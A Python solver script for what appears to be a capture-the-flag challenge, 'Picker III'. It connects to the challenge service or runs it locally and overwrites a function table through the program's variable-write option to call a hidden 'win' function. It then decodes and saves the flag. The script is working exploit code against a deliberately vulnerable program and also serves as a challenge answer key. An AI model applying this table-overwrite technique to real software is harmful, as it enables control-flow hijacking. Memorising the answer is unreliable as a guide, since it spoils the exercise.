#!/usr/bin/env python3
"""
Deterministic solver for Picker III (#402)
Supports both remote instance socket communication and local execution fallback.
"""
import socket
import re
import sys
import subprocess
from pathlib import Path

def get_target():
    cfg_file = Path(__file__).resolve().parent / "connection.cfg"
    host, port = None, 0
    if cfg_file.exists():
        for line in cfg_file.read_text().splitlines():
            line = line.strip()
            if line.startswith("HOST="):
                val = line.split("=", 1)[1].strip()
                if val:
                    host = val
            elif line.startswith("PORT="):
                try:
                    val = int(line.split("=", 1)[1].strip())
                    if val > 0:
                        port = val
                except Exception:
                    pass
    return host, port

def recv_until(s, delim):
    buf = b""
    while delim not in buf:
        chunk = s.recv(1)
        if not chunk:
            break
        buf += chunk
    return buf.decode(errors="ignore")

def parse_flag_from_output(output):
    hex_values = re.findall(r"0x[0-9a-fA-F]+", output)
    if hex_values:
        flag = "".join(chr(int(h, 16)) for h in hex_values)
        return flag.strip()
    return None

def solve_remote(host, port):
    print(f"[*] Attempting remote connection to {host}:{port}...", flush=True)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))

    # Read initial prompt
    data = recv_until(s, b"==> ")
    # Step 1: select option 3 (write_variable)
    s.sendall(b"3\n")
    # Step 2: enter variable name
    data = recv_until(s, b": ")
    s.sendall(b"func_table\n")
    # Step 3: enter value
    data = recv_until(s, b": ")
    val = "'win' + ' ' * 125\n"
    s.sendall(val.encode())
    # Step 4: call function 1 (which will be win)
    data = recv_until(s, b"==> ")
    s.sendall(b"1\n")
    # Read response
    data = recv_until(s, b"==> ")
    s.close()
    return parse_flag_from_output(data)

def solve_local():
    print("[*] Running local verification via subprocess...", flush=True)
    script_path = Path(__file__).resolve().parent / "picker-III.py"
    payload = "3\nfunc_table\n'win' + ' ' * 125\n1\nquit\n"
    p = subprocess.Popen(
        [sys.executable, str(script_path)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    stdout, _ = p.communicate(input=payload)
    return parse_flag_from_output(stdout)

def solve():
    host, port = get_target()
    flag = None
    if host and port > 0:
        try:
            flag = solve_remote(host, port)
        except Exception as e:
            print(f"[-] Remote connection failed: {e}. Falling back to local execution...", flush=True)

    if not flag:
        flag = solve_local()

    if flag:
        print(f"\n[+] Extracted Flag: {flag}", flush=True)
        flag_path = Path(__file__).resolve().parent / "flag.txt"
        flag_path.write_text(flag)
        print(f"[+] Saved flag to {flag_path}", flush=True)
        return flag
    else:
        print("[-] Could not retrieve flag", flush=True)
        return None

if __name__ == "__main__":
    solve()
